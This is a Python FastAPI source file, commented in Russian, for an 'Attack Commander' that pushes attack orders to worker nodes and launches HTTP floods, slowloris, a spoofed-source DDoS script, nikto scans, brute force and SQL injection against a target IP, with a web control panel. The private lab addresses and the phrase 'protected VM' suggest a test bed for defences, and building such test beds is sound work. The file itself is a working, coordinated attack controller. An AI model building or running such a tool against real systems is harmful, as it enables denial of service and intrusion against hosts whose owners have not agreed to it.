"""
COMMANDER — главная атакующая нода (atk-1).
Push-модель: командер сам толкает команды воркерам, воркеры ничего не знают о командере.

Установка воркеров:
  1. Запустить agent.py на каждом воркере (install_worker.sh)
  2. Добавить воркера в UI или через API: POST /workers/add {"ip": "192.168.10.3"}

API:
  GET    /status          — общий статус
  GET    /workers         — список воркеров
  POST   /workers/add     — добавить воркера  {"ip": "..."}
  DELETE /workers/{ip}    — удалить воркера
  POST   /attack/start    — запустить атаку   {"attack_type": "flood", "target": "..."}
  POST   /attack/stop     — остановить всех
  POST   /target          — установить цель   {"target": "..."}
  GET    /ui              — веб-интерфейс
"""

import os
import sys
import time
import socket
import subprocess
import threading
import logging
import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger("commander")

TARGET  = os.getenv("TARGET_IP", "")
PORT    = int(os.getenv("CMD_PORT", 5000))
W_PORT  = int(os.getenv("WORKER_PORT", 5001))

# Путь к скриптам атак — рядом с этим файлом
_HERE = os.path.dirname(os.path.abspath(__file__))
A = lambda name: os.path.join(_HERE, "attacks", name)

app = FastAPI(title="Attack Commander")

state = {
    "target":         TARGET,
    "attack_active":  False,
    "current_attack": None,
    "workers": {},  # ip → {ip, hostname, status, last_checked}
}

current_proc = None


# ─── Локальные атаки командера ────────────────────────────────────────────────
ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "500000", "-c", "300", "-q", f"http://{t}/"],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "120s", "-quiet"],
    "brute":     lambda t: [sys.executable, A("brute.py"), t],
    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
    "flash":     lambda t: ["wrk", "-t4", "-c50", "-d60s", f"http://{t}/"],
    "slow":      lambda t: ["wrk", "-t2", "-c20", "-d60s", f"http://{t}/search"],
    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
}


def run_local(attack_type: str, target: str):
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
    logger.info(f"[local] {attack_type} → {target}")
    try:
        current_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError as e:
        logger.error(f"Команда не найдена: {e}")


def stop_local():
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    current_proc = None


# ─── Управление воркерами (push) ──────────────────────────────────────────────
def push_all(endpoint: str, data: dict | None = None):
    """Отправить команду всем воркерам параллельно."""
    def _send(ip: str):
        try:
            url = f"http://{ip}:{W_PORT}/{endpoint}"
            r = requests.post(url, json=data or {}, timeout=3)
            state["workers"][ip]["status"] = r.json().get("status", "ok")
        except Exception as e:
            state["workers"][ip]["status"] = "offline"
            logger.warning(f"[{ip}] недоступен: {e}")

    threads = [threading.Thread(target=_send, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=4)


def check_worker(ip: str):
    """Проверить статус одного воркера."""
    try:
        r = requests.get(f"http://{ip}:{W_PORT}/status", timeout=2)
        info = r.json()
        state["workers"][ip].update({
            "hostname":     info.get("host", ip),
            "status":       info.get("status", "idle"),
            "last_checked": time.time(),
        })
    except Exception:
        if ip in state["workers"]:
            state["workers"][ip]["status"] = "offline"


def check_all_workers():
    threads = [threading.Thread(target=check_worker, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=3)


def _bg_refresh():
    while True:
        time.sleep(5)
        if state["workers"]:
            check_all_workers()


threading.Thread(target=_bg_refresh, daemon=True).start()


# ─── API ─────────────────────────────────────────────────────────────────────
@app.get("/status")
def get_status():
    online = sum(1 for w in state["workers"].values()
                 if w.get("status") not in ("offline", "checking"))
    return {
        "target":         state["target"],
        "attack_active":  state["attack_active"],
        "current_attack": state["current_attack"],
        "workers_total":  len(state["workers"]),
        "workers_online": online,
        "workers":        state["workers"],
    }


@app.get("/workers")
def get_workers():
    return state["workers"]


@app.post("/workers/add")
def add_worker(body: dict):
    ip = (body.get("ip") or "").strip()
    if not ip:
        return {"error": "ip required"}
    if ip not in state["workers"]:
        state["workers"][ip] = {
            "ip":           ip,
            "hostname":     ip,
            "status":       "checking",
            "last_checked": 0,
        }
        threading.Thread(target=check_worker, args=(ip,), daemon=True).start()
    return {"added": ip, "total": len(state["workers"])}


@app.delete("/workers/{worker_ip}")
def remove_worker(worker_ip: str):
    state["workers"].pop(worker_ip, None)
    return {"removed": worker_ip, "total": len(state["workers"])}


@app.post("/attack/start")
def start_attack(body: dict):
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target IP not set — установи цель сначала"}

    state["attack_active"]  = True
    state["current_attack"] = attack_type
    state["target"]         = target

    run_local(attack_type, target)
    push_all("run", {"attack_type": attack_type, "target": target})

    logger.info(f"Атака {attack_type} → {target} | воркеров: {len(state['workers'])}")
    return {
        "status":           "started",
        "attack":           attack_type,
        "target":           target,
        "workers_notified": len(state["workers"]),
    }


@app.post("/attack/stop")
def stop_attack():
    state["attack_active"]  = False
    state["current_attack"] = None
    stop_local()
    push_all("stop")
    return {"status": "stopped"}


@app.post("/target")
def set_target(body: dict):
    state["target"] = (body.get("target") or state["target"]).strip()
    return {"target": state["target"]}


# ─── Веб-интерфейс ────────────────────────────────────────────────────────────
@app.get("/ui", response_class=HTMLResponse)
def ui():
    return _UI_HTML


_UI_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Attack Commander</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: monospace; background: #0d0d0d; color: #bbb; padding: 16px; }
h1 { color: #e33; margin-bottom: 14px; font-size: 20px; }

.topbar { display: flex; gap: 24px; background: #161616; border: 1px solid #2a2a2a;
          border-radius: 5px; padding: 10px 16px; margin-bottom: 14px; font-size: 13px; }
.topbar .lbl { color: #555; }
.topbar .val { color: #eee; }
.topbar .val.active { color: #fa0; font-weight: bold; }

.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
.card { background: #161616; border: 1px solid #2a2a2a; border-radius: 5px; padding: 14px; }
.card h3 { color: #ddd; font-size: 13px; margin-bottom: 10px; border-bottom: 1px solid #222; padding-bottom: 6px; }

input { width: 100%; background: #1e1e1e; color: #ccc; border: 1px solid #333;
        border-radius: 4px; padding: 7px 10px; font-size: 13px; margin-bottom: 8px; }
input:focus { outline: none; border-color: #555; }

.btn { background: #1e1e1e; border: 1px solid #0af; color: #0af; border-radius: 4px;
       padding: 6px 13px; cursor: pointer; font-size: 13px; margin: 3px 2px; }
.btn:hover { background: #0af; color: #000; }
.btn.red  { border-color: #e44; color: #e44; }
.btn.red:hover  { background: #e44; color: #fff; }
.btn.green { border-color: #4c4; color: #4c4; }
.btn.green:hover { background: #4c4; color: #000; }
.btn.full { width: 100%; margin: 6px 0 0; }

.attacks { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 8px; }

.worker { display: flex; align-items: center; justify-content: space-between;
          padding: 6px 0; border-bottom: 1px solid #1e1e1e; font-size: 12px; }
.worker:last-child { border-bottom: none; }
.dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; }
.idle     .dot { background: #4c4; }
.attacking .dot { background: #fa0; }
.offline  .dot { background: #e44; }
.checking .dot { background: #666; }
.worker-name { color: #ccc; }
.worker-ip   { color: #555; margin-left: 6px; }
.worker-st   { color: #666; margin: 0 8px; }

#log { height: 110px; overflow-y: auto; background: #0a0a0a; border: 1px solid #1e1e1e;
       border-radius: 4px; padding: 8px; font-size: 12px; color: #666; }
.log-ts { color: #333; }
</style>
</head>
<body>
<h1>⚔ ATTACK COMMANDER</h1>

<!-- Статус-бар -->
<div class="topbar">
  <span><span class="lbl">Цель: </span><span id="sb-target" class="val">—</span></span>
  <span><span class="lbl">Атака: </span><span id="sb-attack" class="val">—</span></span>
  <span><span class="lbl">Воркеры: </span><span id="sb-workers" class="val">0/0</span></span>
  <span><span class="lbl">Статус: </span><span id="sb-status" class="val">idle</span></span>
</div>

<div class="grid">

  <!-- Цель + атаки -->
  <div class="card">
    <h3>🎯 ЦЕЛЬ И АТАКИ</h3>
    <input id="target-ip" placeholder="IP защищаемой VM (напр. 192.168.10.5)">
    <button class="btn" onclick="setTarget()">Установить цель</button>
    <br><br>
    <div class="attacks">
      <button class="btn" onclick="attack('flood')">🌊 HTTP Flood</button>
      <button class="btn" onclick="attack('ddos')">💥 DDoS Spoof</button>
      <button class="btn" onclick="attack('scan')">🔍 Nikto Scan</button>
      <button class="btn" onclick="attack('brute')">🔑 Brute Force</button>
      <button class="btn" onclick="attack('sqli')">💉 SQL Inject</button>
      <button class="btn" onclick="attack('slowloris')">🐢 Slowloris</button>
      <button class="btn" onclick="attack('flash')">⚡ Flash Crowd</button>
      <button class="btn" onclick="attack('slow')">🌙 Медл. флуд</button>
    </div>
    <button class="btn red full" onclick="stopAll()">⛔ СТОП — остановить всё</button>
  </div>

  <!-- Воркеры -->
  <div class="card">
    <h3>📡 ВОРКЕРЫ <span id="w-count" style="color:#555">(0)</span></h3>
    <input id="worker-ip" placeholder="IP воркера (напр. 192.168.10.3)">
    <button class="btn green" onclick="addWorker()">➕ Добавить воркера</button>
    <div id="workers-list" style="margin-top:10px">
      <span style="color:#444;font-size:12px">Нет воркеров. Запусти install_worker.sh на нодах и добавь их IP сюда.</span>
    </div>
  </div>

</div>

<!-- Лог -->
<div class="card">
  <h3>📋 ЛОГ</h3>
  <div id="log"></div>
</div>

<script>
const B = window.location.origin;

function ts() { return new Date().toLocaleTimeString(); }
function log(msg, color) {
  const d = document.getElementById('log');
  d.innerHTML = `<span class="log-ts">[${ts()}]</span> <span style="color:${color||'#8af'}">${msg}</span><br>` + d.innerHTML;
}

async function setTarget() {
  const t = document.getElementById('target-ip').value.trim();
  if (!t) return;
  await fetch(B+'/target', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:t})});
  log(`Цель → ${t}`);
  refresh();
}

async function addWorker() {
  const ip = document.getElementById('worker-ip').value.trim();
  if (!ip) return;
  const r = await fetch(B+'/workers/add', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip})});
  const d = await r.json();
  if (d.error) { log('❌ '+d.error, '#e44'); return; }
  document.getElementById('worker-ip').value = '';
  log(`Воркер добавлен: ${ip}`, '#4c4');
  refresh();
}

async function removeWorker(ip) {
  await fetch(B+'/workers/'+encodeURIComponent(ip), {method:'DELETE'});
  log(`Воркер удалён: ${ip}`, '#e44');
  refresh();
}

async function attack(type) {
  const target = document.getElementById('target-ip').value.trim();
  const r = await fetch(B+'/attack/start', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({attack_type:type, target:target||undefined})});
  const d = await r.json();
  if (d.error) { log('❌ '+d.error, '#e44'); return; }
  log(`▶ ${type} → ${d.target}  (воркеров: ${d.workers_notified})`, '#fa0');
}

async function stopAll() {
  await fetch(B+'/attack/stop', {method:'POST'});
  log('⛔ Остановлено', '#e44');
}

function dotCls(s) {
  return {attacking:'attacking', offline:'offline', checking:'checking'}[s] || 'idle';
}

async function refresh() {
  const r = await fetch(B+'/status');
  const d = await r.json();

  document.getElementById('sb-target').textContent  = d.target || '—';
  document.getElementById('sb-attack').textContent  = d.current_attack || '—';
  document.getElementById('sb-workers').textContent = d.workers_online+'/'+d.workers_total;
  const se = document.getElementById('sb-status');
  se.textContent = d.attack_active ? (d.current_attack || 'active') : 'idle';
  se.className   = 'val' + (d.attack_active ? ' active' : '');

  if (!document.getElementById('target-ip').value && d.target)
    document.getElementById('target-ip').value = d.target;

  const keys = Object.keys(d.workers);
  document.getElementById('w-count').textContent = '('+keys.length+')';
  const wl = document.getElementById('workers-list');
  if (!keys.length) {
    wl.innerHTML = '<span style="color:#444;font-size:12px">Нет воркеров. Запусти install_worker.sh на нодах и добавь их IP сюда.</span>';
  } else {
    wl.innerHTML = keys.map(ip => {
      const w = d.workers[ip];
      const s = w.status || 'checking';
      const name = (w.hostname && w.hostname !== ip) ? w.hostname : '';
      return `<div class="worker ${dotCls(s)}">
        <span>
          <span class="dot"></span>
          <span class="worker-name">${name}</span>
          <span class="worker-ip">${ip}</span>
        </span>
        <span class="worker-st">${s}</span>
        <button class="btn red" style="padding:2px 8px;font-size:11px" onclick="removeWorker('${ip}')">✕</button>
      </div>`;
    }).join('');
  }
}

setInterval(refresh, 3000);
refresh();
</script>
</body>
</html>"""


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"Commander ready — http://{my_ip}:{PORT}/ui")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
